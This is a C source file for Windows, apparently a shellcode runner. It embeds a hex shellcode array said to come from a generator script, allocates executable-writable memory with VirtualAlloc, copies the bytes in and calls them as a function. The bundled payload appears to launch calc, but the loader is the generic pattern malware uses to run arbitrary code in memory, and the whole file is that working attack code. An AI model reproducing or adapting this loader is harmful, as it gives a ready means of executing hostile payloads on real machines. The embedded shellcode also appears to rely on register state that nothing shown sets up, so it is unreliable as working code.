#include <windows.h>
#include <stdio.h>

// Shellcode, generated from ngen.py
// This is the C-Style hex string output from the generator.
unsigned char shellcode[] = 
    "\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xc0\x50\x48\xb8\x75\xee\x40\x70\x00\x00\x00\x00\x50\x48\x89\xe1\x48\x83\xec\x20\x41\xff\x14\x24\x48\x31\xf6\x4c\x89\xf1\x41\xff\x14\x24\x48\x31\xc9\x48\x89\xe2\x52\x48\x89\xe1\x48\x83\xec\x20\x41\xff\x14\x24\x48\x31\xc9\x48\x89\xe2\x48\xb9\x5b\x39\x66\x06\x00\x00\x00\x00\x52\x48\x89\xe1\x48\x83\xec\x20\x41\xff\x14\x24\x48\x31\xf6\x4d\x31\xc0\x4d\x31\xc9\x49\x89\xc0\x49\x89\xd1\x48\x31\xd2\x52\x48\xb9\x7f\x2f\x17\x82\x00\x00\x00\x00\x52\x48\x89\xe1\x48\x83\xec\x20\x41\xff\x14\x24\x48\x83\xc4\x20\x48\x31\xc9\x48\x31\xd2\x48\xb8\x79\xfe\xf6\x9e\x00\x00\x00\x00\x50\x48\x89\xe1\x48\x83\xec\x20\x41\xff\x14\x24\x48\x83\xc4\x20\x48\x89\xc7\x48\x31\xc0\x50\x48\xb8\x63\x61\x6c\x63\x00\x20\x00\x00\x48\x89\xe1\x48\x31\xd2\x48\xff\xc2\x48\x83\xec\x20\xff\xd7\x48\x83\xc4\x20\x48\x31\xc0\x48\x83\xc4\x28\xc3";

// Determine the size of the shellcode array
size_t shellcode_len = sizeof(shellcode) - 1; // Subtract 1 for the null-terminator

int main()
{
    // 1. Allocate a memory buffer with EXECUTE_READWRITE permissions
    // This memory will hold the shellcode.
    LPVOID exec_mem = VirtualAlloc(
        NULL,                   // let the OS decide where to place it
        shellcode_len,          // size of the memory block
        MEM_COMMIT | MEM_RESERVE, // commit and reserve the memory
        PAGE_EXECUTE_READWRITE  // give it executable and writable permissions
    );

    if (exec_mem == NULL) {
        printf("[-] VirtualAlloc failed. Error Code: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Memory allocated at: 0x%p\n", exec_mem);
    
    // 2. Copy the shellcode into the executable memory block
    RtlMoveMemory(exec_mem, shellcode, shellcode_len);
    printf("[+] Shellcode copied to memory.\n");

    // 3. Execute the shellcode!
    // Cast the executable memory address to a function pointer prototype and call it.
    // The function prototype is defined to take no parameters and return an int.
    int (*funk)();
    funk = (int (*)())exec_mem;

    printf("[!] Executing shellcode...\n");
    funk(); // Execution begins here

    // Clean up
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    printf("[+] Execution finished. Memory released.\n");

    return 0;
}
